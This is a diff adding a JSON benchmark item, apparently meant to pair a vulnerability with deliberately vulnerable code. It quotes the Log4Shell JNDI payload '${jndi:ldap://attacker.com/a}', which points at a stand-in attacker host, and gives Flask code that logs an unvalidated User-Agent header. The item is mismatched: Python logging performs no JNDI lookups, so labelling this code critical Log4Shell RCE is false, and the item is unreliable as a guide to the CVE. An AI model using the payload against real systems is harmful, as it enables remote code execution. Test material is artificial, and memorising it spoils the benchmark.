@@ -1,0 +1,10 @@
+{
+  "id": "CVE-2021-44228",
+  "name": "Log4Shell",
+  "description": "Log4j2 JNDI injection via user-controlled string logged with log4j. When a log call includes user input (e.g., HTTP headers like User-Agent or X-Forwarded-For), Log4j interprets ${jndi:ldap://attacker.com/a} as a lookup and makes an outbound LDAP connection, enabling RCE.",
+  "spec": "Write a Python web service that logs incoming HTTP requests including the User-Agent header for debugging purposes.",
+  "vulnerable_code": "import logging\nfrom flask import Flask, request\napp = Flask(__name__)\nlogging.basicConfig(level=logging.INFO)\n\n@app.route('/')\ndef index():\n    user_agent = request.headers.get('User-Agent', '')\n    logging.info(f'Request from: {user_agent}')  # vulnerable: logs unvalidated input\n    return 'OK'\n",
+  "expected_cwe": "CWE-117",
+  "expected_keyword": "log injection",
+  "severity": "critical"
+}
